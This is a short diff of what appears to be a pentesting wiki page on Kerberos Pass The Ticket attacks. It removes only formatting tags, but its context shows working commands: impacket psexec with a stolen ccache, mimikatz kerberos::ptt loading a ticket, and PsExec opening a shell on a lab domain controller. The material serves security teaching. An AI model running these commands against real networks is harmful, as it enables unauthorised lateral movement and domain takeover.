@@ -44,14 +44,14 @@ Converting kirbi => ccache
 
 ### Pass The Ticket Attack
 
-{% code title="Linux" %}
+
 ```bash
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
 ```
-{% endcode %}
 
-{% code title="Windows" %}
+
+
 ```bash
 #Load the ticket in memory using mimikatz or Rubeus
 mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
@@ -59,7 +59,7 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-{% endcode %}
+
 
 ## References
 
